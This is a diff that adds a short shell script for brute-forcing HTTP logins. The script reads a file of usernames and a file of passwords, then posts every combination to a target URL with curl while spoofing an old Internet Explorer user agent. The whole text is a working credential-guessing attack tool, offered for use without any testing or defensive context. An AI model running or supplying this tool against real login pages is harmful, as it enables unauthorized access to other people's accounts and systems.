@@ -1,0 +1,28 @@
+#!/bin/sh
+
+# HTTP ID/Password Brute-force
+
+if [ $# -ne 3 ]; then
+  echo -e "\n\tUsage: $0 <url> <id file> <password file>"
+  exit 1;
+fi
+
+TARGET=$1
+IDLIST=`/bin/cat $2`
+PASSLIST=`/bin/cat $3`
+
+for ID in $IDLIST; do
+  for PASS in $PASSLIST; do
+    echo "ID=$ID, PW=$PASS"
+    echo "================"
+    /usr/bin/curl \
+	--user-agent 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' \
+	--header 'Host: localhost' \
+	--header 'Accept: image/gif, image/x-xbitmap, */*' \
+	--header 'Accept-Language: en-us' \
+	--header 'Connection: Keep-Alive' \
+	-d username=$ID \
+	-d password=$PASS \
+    $TARGET
+  done
+done
